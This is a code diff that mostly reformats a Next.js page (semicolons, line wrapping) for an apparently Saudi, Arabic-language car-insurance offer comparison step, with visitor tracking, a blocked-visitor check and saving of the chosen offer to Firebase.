@@ -1,96 +1,117 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Globe, Plus, ShoppingCart } from 'lucide-react'
-import { FullPageLoader } from "@/components/loader"
-import { StepShell } from "@/components/step-shell"
-import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
-import { useAutoSave } from "@/hooks/use-auto-save"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { addData } from "@/lib/firebase"
-import { offerData } from "@/lib/offer-data"
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Globe, Plus, ShoppingCart } from "lucide-react";
+import { FullPageLoader } from "@/components/loader";
+import { StepShell } from "@/components/step-shell";
+import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
+import { useAutoSave } from "@/hooks/use-auto-save";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { addData } from "@/lib/firebase";
+import { offerData } from "@/lib/offer-data";
 
 export default function ComparisonPage() {
-  const router = useRouter()
-  const [visitorID] = useState(() => getOrCreateVisitorID())
-  const [loading, setLoading] = useState(true)
-  const [isBlocked, setIsBlocked] = useState(false)
+  const router = useRouter();
+  const [visitorID] = useState(() => getOrCreateVisitorID());
+  const [loading, setLoading] = useState(true);
+  const [isBlocked, setIsBlocked] = useState(false);
 
-  const [selectedOffer, setSelectedOffer] = useState<any>(null)
-  const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
-  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
-  const [offersTab, setOffersTab] = useState<"comprehensive" | "against-others">("against-others")
-  const [language, setLanguage] = useState<"ar" | "en">("ar")
+  const [selectedOffer, setSelectedOffer] = useState<any>(null);
+  const [selectedFeatures, setSelectedFeatures] = useState<
+    Record<string, string[]>
+  >({});
+  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0);
+  const [offersTab, setOffersTab] = useState<
+    "comprehensive" | "against-others"
+  >("against-others");
+  const [language, setLanguage] = useState<"ar" | "en">("ar");
 
   useAutoSave({
     visitorId: visitorID,
     pageName: "compar",
-    data: { selectedOffer: selectedOffer?.company?.name || "", selectedFeatures, offerTotalPrice }
-  })
+    data: {
+      selectedOffer: selectedOffer?.company?.name || "",
+      selectedFeatures,
+      offerTotalPrice,
+    },
+  });
 
-  useRedirectMonitor({ visitorId: visitorID, currentPage: "compar" })
+  useRedirectMonitor({ visitorId: visitorID, currentPage: "compar" });
 
   useEffect(() => {
     const init = async () => {
-      const blocked = await checkIfBlocked(visitorID)
-      if (blocked) { setIsBlocked(true); setLoading(false); return }
-      setLoading(false)
-    }
-    init()
-  }, [visitorID])
+      const blocked = await checkIfBlocked(visitorID);
+      if (blocked) {
+        setIsBlocked(true);
+        setLoading(false);
+        return;
+      }
+      setLoading(false);
+    };
+    init();
+  }, [visitorID]);
 
   const toggleFeature = (offerId: string, featureId: string) => {
     setSelectedFeatures((prev) => {
-      const current = prev[offerId] || []
+      const current = prev[offerId] || [];
       return current.includes(featureId)
         ? { ...prev, [offerId]: current.filter((id) => id !== featureId) }
-        : { ...prev, [offerId]: [...current, featureId] }
-    })
-  }
+        : { ...prev, [offerId]: [...current, featureId] };
+    });
+  };
 
-  const calculateOfferTotal = (offer: (typeof offerData)[0], selFeatures: string[] = []) => {
-    const mainPrice = Number.parseFloat(offer.main_price)
-    const featuresPrice = offer.extra_features.filter(f => selFeatures.includes(f.id)).reduce((s, f) => s + f.price, 0)
-    const expensesTotal = offer.extra_expenses.reduce((s, e) => s + e.price, 0)
-    return mainPrice + featuresPrice + expensesTotal
-  }
+  const calculateOfferTotal = (
+    offer: (typeof offerData)[0],
+    selFeatures: string[] = [],
+  ) => {
+    const mainPrice = Number.parseFloat(offer.main_price);
+    const featuresPrice = offer.extra_features
+      .filter((f) => selFeatures.includes(f.id))
+      .reduce((s, f) => s + f.price, 0);
+    const expensesTotal = offer.extra_expenses.reduce((s, e) => s + e.price, 0);
+    return mainPrice + featuresPrice + expensesTotal;
+  };
 
-  const filteredOffers = offerData.filter(o => o.type === offersTab)
+  const filteredOffers = offerData.filter((o) => o.type === offersTab);
 
   const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
-    setSelectedOffer(offer)
-    const selFeatures = selectedFeatures[offer.id] || []
-    const totalPrice = calculateOfferTotal(offer, selFeatures)
-    const finalPrice = Number.parseFloat(totalPrice.toFixed(2))
-    setOfferTotalPrice(finalPrice)
+    setSelectedOffer(offer);
+    const selFeatures = selectedFeatures[offer.id] || [];
+    const totalPrice = calculateOfferTotal(offer, selFeatures);
+    const finalPrice = Number.parseFloat(totalPrice.toFixed(2));
+    setOfferTotalPrice(finalPrice);
     await addData({
       id: visitorID,
       selectedOffer: {
         name: offer.company.name,
         image_url: offer.company.image_url,
         type: offer.type,
-        extra_features: offer.extra_features.filter(f => selFeatures.includes(f.id))
+        extra_features: offer.extra_features.filter((f) =>
+          selFeatures.includes(f.id),
+        ),
       },
       offerTotalPrice: finalPrice,
       selectedFeatures: selFeatures,
       currentStep: 4,
       currentPage: "check",
-      comparCompletedAt: new Date().toISOString()
-    }).then(() => router.push('/check'))
-  }
+      comparCompletedAt: new Date().toISOString(),
+    }).then(() => router.push("/check"));
+  };
 
-  if (loading) return <FullPageLoader />
+  if (loading) return <FullPageLoader />;
 
   if (isBlocked) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-gray-50">
         <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
-          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
+          <h1 className="text-2xl font-bold text-red-600 mb-4">
+            تم حظر الوصول
+          </h1>
           <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
         </div>
       </div>
-    )
+    );
   }
 
   return (
@@ -112,8 +133,9 @@ export default function ComparisonPage() {
       {/* Bank Notice */}
       <div className="mb-4" dir="rtl">
         <div className="bg-[#e8f4fd] border border-[#b3d9f5] rounded-xl p-3 text-[#1565c0] text-xs leading-relaxed">
-          بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة واسترداد كامل المبلغ المدفوع خلال
-          15 يوماً من تاريخ الشراء، بشرط عدم حدوث أي مطالبات خلال هذه الفترة.
+          بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة
+          واسترداد كامل المبلغ المدفوع خلال 15 يوماً من تاريخ الشراء، بشرط عدم
+          حدوث أي مطالبات خلال هذه الفترة.
         </div>
       </div>
 
@@ -146,9 +168,10 @@ export default function ComparisonPage() {
       {/* Offers */}
       <div className="space-y-4">
         {filteredOffers.map((offer) => {
-          const selFeatures = selectedFeatures[offer.id] || []
-          const totalPrice = calculateOfferTotal(offer, selFeatures)
-          const typeLabel = offer.type === "against-others" ? "ضد الغير" : "شامل"
+          const selFeatures = selectedFeatures[offer.id] || [];
+          const totalPrice = calculateOfferTotal(offer, selFeatures);
+          const typeLabel =
+            offer.type === "against-others" ? "ضد الغير" : "شامل";
 
           return (
             <div
@@ -157,11 +180,15 @@ export default function ComparisonPage() {
               dir="rtl"
             >
               {/* ── Section 1: Company Header ── */}
-              <div className="flex items-center justify-between px-4 py-4">
+              <div className="flex items-center justify-between px-2 py-2">
                 {/* RIGHT in RTL: name + subtitle */}
                 <div>
-                  <h3 className="text-lg font-bold text-gray-900 leading-tight">{offer.company.name}</h3>
-                  <p className="text-sm text-gray-400 mt-0.5">{typeLabel} - تأمين معتمد</p>
+                  <h3 className="text-lg font-bold text-gray-900 leading-tight">
+                    {offer.company.name}
+                  </h3>
+                  <p className="text-sm text-gray-400 mt-0.5">
+                    {typeLabel} - تأمين معتمد
+                  </p>
                 </div>
                 {/* LEFT in RTL: logo */}
                 <div className="w-16 h-14 flex items-center justify-center flex-shrink-0">
@@ -180,7 +207,9 @@ export default function ComparisonPage() {
                 {/* Features header */}
                 <div className="flex items-center justify-between px-4 py-3">
                   {/* RIGHT: title */}
-                  <span className="text-base font-bold text-gray-800">المنافع الإضافية</span>
+                  <span className="text-base font-bold text-gray-800">
+                    المنافع الإضافية
+                  </span>
                   {/* LEFT: + button */}
                   <div className="w-7 h-7 rounded-full bg-[#1976d2] flex items-center justify-center flex-shrink-0">
                     <Plus className="w-4 h-4 text-white" strokeWidth={3} />
@@ -191,7 +220,7 @@ export default function ComparisonPage() {
                 {offer.extra_features.length > 0 && (
                   <div className="px-4 pb-3 space-y-3">
                     {offer.extra_features.map((feature) => {
-                      const checked = selFeatures.includes(feature.id)
+                      const checked = selFeatures.includes(feature.id);
                       return (
                         <label
                           key={feature.id}
@@ -202,7 +231,9 @@ export default function ComparisonPage() {
                           <span className="flex-1 text-sm text-gray-700 leading-relaxed">
                             {feature.content}
                             {feature.price > 0 && (
-                              <span className="text-[#1976d2] font-semibold mr-1">(+{feature.price} ﷼)</span>
+                              <span className="text-[#1976d2] font-semibold mr-1">
+                                (+{feature.price} ﷼)
+                              </span>
                             )}
                           </span>
                           {/* Custom checkbox LEFT side */}
@@ -215,8 +246,18 @@ export default function ComparisonPage() {
                             }`}
                           >
                             {checked && (
-                              <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 12 12" stroke="currentColor" strokeWidth={2.5}>
-                                <path strokeLinecap="round" strokeLinejoin="round" d="M2 6l3 3 5-5" />
+                              <svg
+                                className="w-3 h-3 text-white"
+                                fill="none"
+                                viewBox="0 0 12 12"
+                                stroke="currentColor"
+                                strokeWidth={2.5}
+                              >
+                                <path
+                                  strokeLinecap="round"
+                                  strokeLinejoin="round"
+                                  d="M2 6l3 3 5-5"
+                                />
                               </svg>
                             )}
                           </div>
@@ -228,7 +269,7 @@ export default function ComparisonPage() {
                             className="sr-only"
                           />
                         </label>
-                      )
+                      );
                     })}
                   </div>
                 )}
@@ -237,8 +278,13 @@ export default function ComparisonPage() {
                 {offer.extra_expenses.length > 0 && (
                   <div className="px-4 pb-3 border-t border-dashed border-gray-200 pt-3">
                     {offer.extra_expenses.map((expense) => (
-                      <div key={expense.id} className="flex justify-between items-center text-xs text-gray-500 py-0.5">
-                        <span className="text-[#1976d2] font-semibold">{expense.price} ﷼</span>
+                      <div
+                        key={expense.id}
+                        className="flex justify-between items-center text-xs text-gray-500 py-0.5"
+                      >
+                        <span className="text-[#1976d2] font-semibold">
+                          {expense.price} ﷼
+                        </span>
                         <span>{expense.reason}</span>
                       </div>
                     ))}
@@ -255,7 +301,8 @@ export default function ComparisonPage() {
                   <div className="text-center pt-3 pb-1">
                     <p className="text-xs text-gray-500 mb-1">الإجمالي</p>
                     <p className="text-2xl font-bold text-[#1976d2] leading-tight">
-                      {totalPrice.toFixed(2)} <span className="text-lg">ريال</span>
+                      {totalPrice.toFixed(2)}{" "}
+                      <span className="text-lg">ريال</span>
                     </p>
                   </div>
                   <div className="p-2">
@@ -271,15 +318,18 @@ export default function ComparisonPage() {
 
                 {/* Terms link — LEFT side (second in RTL) */}
                 <div className="flex-shrink-0">
-                  <a href="#" className="text-xs text-[#1976d2] underline underline-offset-2">
+                  <a
+                    href="#"
+                    className="text-xs text-[#1976d2] underline underline-offset-2"
+                  >
                     الشروط والأحكام
                   </a>
                 </div>
               </div>
             </div>
-          )
+          );
         })}
       </div>
     </StepShell>
-  )
+  );
 }
